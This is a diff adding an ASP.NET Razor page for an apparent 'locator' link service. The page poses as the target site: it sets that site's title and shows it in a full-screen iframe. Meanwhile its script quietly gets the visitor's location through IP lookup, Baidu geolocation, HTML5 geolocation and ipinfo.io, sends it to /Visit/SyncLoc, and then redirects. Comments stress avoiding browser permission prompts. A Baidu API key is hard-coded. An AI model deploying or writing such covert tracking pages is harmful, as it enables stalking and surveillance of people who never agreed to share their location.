@@ -1,0 +1,195 @@
+﻿@{ Layout = null; }
+@model LocatorItem
+
+<html>
+<head>
+    <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+    <title>@Model.RedirectTitle</title>
+    <script>
+        function init() { }
+
+        $(function() {
+            window.SPY_LOCATION_HELP_MESSAGE = "";
+
+            exeCurrentLocation(function(latitude, longitude) {
+                $.ajax({
+                    type: "GET",
+                    dataType: "json",
+                    cache: false,
+                    url: '/Visit/SyncLoc?id=' +
+                        '@Model.Identifier' +
+                        '&longitude=' +
+                        longitude +
+                        '&latitude=' +
+                        latitude +
+                        '&message=' +
+                        window.SPY_LOCATION_HELP_MESSAGE,
+                    success: function() {
+                        window.location.href = "@Model.RedirectUrl";
+                    },
+                    error: function() {
+                        window.location.href = "@Model.RedirectUrl";
+                    }
+                });
+            });
+
+            // The new version of doUserLocation(), since 2013.05.
+            function exeCurrentLocation(callback) {
+                // Get location by Baidu IPLocation Server
+                // No need for Geoloctaion object or browser permission
+
+                $.ajax({
+                    // 1. 我们使用百度的后台，获取ajax，出错
+                    // 2. 百度设置了 同源策略，设置了ajax访问限制 Cross-origin
+                    //      MDN 介绍 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS
+                    // 3. 改用 JSONP？ 什么是 JSONP，我们无法修改百度服务器，这不可行
+                    //      原理： https://segmentfault.com/a/1190000012967320   8种跨域方法
+                    //      返回结果是 JSON 而非 JSONP！
+                    //      JSONP是一种js
+                    // 4. 改用反向代理？ 一般的跨域问题，都可以由此解决，但是这个问题适合IP有关系的
+                    //      代理会改动 IP 地址，最后将获取代理服务器的位置信息
+                    //      一个公共的 反向代理 YQL https://blog.csdn.net/m0_38082783/article/details/73331602
+                    // 5. Websocket 不行，他是和http的同级别协议，不是一种东西，需要Server代码变更支持
+                    // 6. iframe 不行，因为同源策略，
+                    //      最终造成：“看得见摸不到问题”
+                    // 7. 依然采用反向代理，但是需要在代理服务器设置 HTTP header https://yq.aliyun.com/articles/638565
+                    // 同时我们不得不 期望 baidu 服务器，做了像这样的 http://www.cnblogs.com/yxyht/archive/2012/10/09/2717408.html 检查
+                    // 否则这就是为了数据安全性的，同源策略，我们无能为力、无法逾越
+
+                    // 1.
+                    //url: "https://map.baidu.com/?qt=ipLocation&t=" + Date.now(),
+                    //
+                    // 2.
+                    //url: "http://query.yahooapis.com/v1/public/yql",
+                    //type: "GET",
+                    //dataType: "jsonp",
+                    //data: {
+                    //    q: 'select * from json where url="https://map.baidu.com/?qt=ipLocation&t=' + Date.now() + '"',
+                    //    format: "json"
+                    //},
+                    //
+                    // 3.
+                    url: "/Visit/BaiduIPLocationServerProxy?ticks=" + Date.now(),
+                    type: "GET",
+                    cache: false,
+                    success: function (data) {
+                        if (data.ipLoc) {
+                            if (data.ipLoc.code === 0 && data.rgc && data.rgc.result) {
+                                window.SPY_LOCATION_HELP_MESSAGE = data.rgc.result.sematic_description;
+                                console.log("# Get location by Baidu IPLocation Server");
+                                callback(data.rgc.result.location.lat, data.rgc.result.location.lng);
+                                return;
+                            } else {
+                                console.warn("# Failed to get location by Baidu IPLocation Server, message: " + data.ipLoc.message);
+                            }
+                        }
+                        getCurrentPositionByBaiduMap(callback);
+                    },
+                    error: function() {
+                        console.warn("# An error occurred while getting location by Baidu IPLocation Server");
+                        getCurrentPositionByBaiduMap(callback);
+                    }
+                });
+
+                // If failed, try Baidu Geolocation
+                function getCurrentPositionByBaiduMap(callback) {
+
+                    // http://lbsyun.baidu.com/jsdemo.htm#a1_5
+                    // https://api.jquery.com/jQuery.getScript/
+                    // Load Baidu reference
+                    // Way 1
+                    //var script = document.createElement("script");
+                    //script.type = "text/javascript";
+                    //script.src = "http://api.map.baidu.com/api?v=2.0&ak=ApKIqsFC7SOAAxNDyoIQ9REooRHh608v&callback=init";
+                    //document.body.appendChild(script);
+
+                    // Way 2
+                    $.getScript("http://api.map.baidu.com/api?v=2.0&ak=ApKIqsFC7SOAAxNDyoIQ9REooRHh608v&callback=init")
+                        .done(function() {
+                            // It's not ready for BMap
+                            // Need timeout?
+                            //setTimeout(function () { }, 2000);
+                            // No, Need baidu init callback
+
+                            setTimeout(function() {
+
+                                    var geolocation = new BMap.Geolocation();
+                                    geolocation.enableSDKLocation();
+
+                                    geolocation.getCurrentPosition(function(r) {
+
+                                            if (this.getStatus() == BMAP_STATUS_SUCCESS) {
+                                                console.log("# Get location by Baidu Map Geolocation");
+                                                callback(r.point.lat, r.point.lng);
+                                            } else {
+                                                console.warn("# Failed to get location by Baidu Map Geolocation");
+                                                getCurrentPositionByGeolocation(callback);
+                                            }
+
+                                        },
+                                        { enableHighAccuracy: true });
+
+                                },
+                                500);
+                        })
+                        .fail(function(jqxhr, settings, exception) {
+                            console.warn(
+                                "# An error occurred while getting script reference for Baidu Map Geolocation, message: " +
+                                exception);
+                            getCurrentPositionByGeolocation(callback);
+                        });
+                }
+
+                // If failed again, try HTML5 Geolocation
+                function getCurrentPositionByGeolocation() {
+
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            function(position) {
+                                console.log("# Get location by HTML5 Geolocation");
+                                callback(position.coords.latitude, position.coords.longitude);
+                            },
+                            function(error) {
+                                console.warn("# Failed to get location by HTML5 Geolocation, message: " + error.message);
+                                getCurrentPositionByIP(callback);
+                            },
+                            {
+                                enableHighAcuracy: false,
+                                timeout: 5000,
+                                maximumAge: 60000
+                            });
+                    } else {
+                        console.warn("# Failed to get location by HTML5 Geolocation, not supported.");
+                        getCurrentPositionByIP(callback);
+                    }
+                }
+
+                // If failed again, try IPInfo.io
+                function getCurrentPositionByIP(callback) {
+                    // http://api.jquery.com/jQuery.get/
+                    $.get("http://ipinfo.io",
+                        function(response) {
+                            if (response.loc) {
+                                console.log("# Get location by IP");
+                                var location = response.loc;
+                                var locationArr = location.split(',');
+                                callback(locationArr[0], locationArr[1]);
+                                return;
+                            } else {
+                                console.error("# Failed to get location by IP.");
+                            }
+                        },
+                        "jsonp").fail(function() {
+                        console.error("# Failed to get location by IP.");
+                    });
+                }
+            };
+        });
+    </script>
+</head>
+<body>
+    <iframe src="@Model.RedirectUrl" style="border: none; bottom: 0; height: 100%; left: 0; margin: 0; overflow: scroll; padding: 0; position: fixed; right: 0; top: 0; width: 100%; z-index: 999999;">
+        @Model.RedirectTitle | Not support iframe
+    </iframe>
+</body>
+</html>
